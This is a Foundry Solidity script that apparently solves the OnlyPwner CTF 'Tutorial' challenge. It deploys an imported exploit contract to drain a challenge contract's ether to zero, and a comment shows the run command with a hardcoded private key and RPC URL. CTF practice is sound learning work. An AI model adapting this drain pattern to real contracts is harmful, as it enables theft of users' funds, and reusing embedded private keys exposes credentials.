// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { Script } from "@dev/forge-std/Script.sol";
import { console2 } from "@dev/forge-std/console2.sol";
import { Tutorial, TutorialExploit } from "@contracts/CTF/ONLYPWNER/02.TUTORIAL.sol";

/*

forge script \
    foundry/script/CTF/ONLYPWNER/01.TUTORIAL.s.sol:TUTORIAL_01_Exploit \
    --rpc-url https://nodes.onlypwner.xyz/rpc/42b2c243-c01f-4de0-a521-7856279a2ab2 \
    --private-key be0a5d9f38057fa406c987fd1926f7bfc49f094dc4e138fc740665d179e6a56a \
    --with-gas-price 0 \
    -vvvv  --broadcast
*/

contract TUTORIAL_01_Exploit is Script {
    Tutorial private victimInstance;
    TutorialExploit private exploitInstance;

    function _localSetup() public {
        victimInstance = new Tutorial{ value: 10 ether }();
        // victimInstance.deposit{ value: 10 ether }();
    }

    function run() public {
        vm.startBroadcast();
        bool isDEV = false;
        // 1. Local DEV SET UP
        if (isDEV) _localSetup();
        // 2. Challenge SET UP
        else victimInstance = Tutorial(address(0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88));

        console2.log("ONLYPWNER CTF Challenge 1 Before Valut Balance:", address(victimInstance).balance);
        console2.log("ONLYPWNER CTF Challenge 1 Before Attacker:", tx.origin);
        console2.log("ONLYPWNER CTF Challenge 1 Before Attacker Balance:", address(tx.origin).balance);

        // Attack
        exploitInstance = new TutorialExploit(address(victimInstance));
        exploitInstance.attack();

        _check();
        vm.stopBroadcast();
    }

    function _check() public view {
        console2.log("ONLYPWNER CTF Challenge 1 After Balance:", address(victimInstance).balance);
        require(address(victimInstance).balance == 0, "Challenge 1 is not solved");
    }
}
